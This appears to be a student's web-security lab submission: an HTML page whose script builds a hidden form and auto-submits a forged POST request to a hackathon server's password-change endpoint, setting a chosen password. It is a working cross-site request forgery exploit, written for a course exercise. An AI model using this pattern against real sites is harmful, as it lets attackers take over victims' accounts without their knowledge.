@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<title>WAPH-Hackathon 4</title>
+<body>
+	<h1>WAPH-Hackathon 4: Cross-Site Request Forgery Attack</h1>
+	<h2>By Hacker Sophia Munoz</h2>
+	<script>
+		function CSRF() {
+			// create a <form> element
+			var form = document.createElement('form');
+			// construct the form
+			form.action = "https://waph-hackathon.eastus.cloudapp.azure.com/csrf/changepassword.php";
+			form.method = 'POST';
+			form.target = '_self';
+			form.innerHTML = "<input type='hidden' name='newpassword' value='munozsahacker' />";
+			// append the form to the current page
+			document.body.appendChild(form);
+			// just for the lab report, to capture the screenshot, otherwise, the CSRF
+			// will be submitted automatically
+			alert('CSRF Attack for Hackathon 4 is about to happen - By Sophia Munoz');
+			// submit the form
+			form.submit();
+		}
+		// call CSRF() to forge an HTTP POST request to the vulnerable server
+		CSRF();
+	</script>
+</body>
+</html>
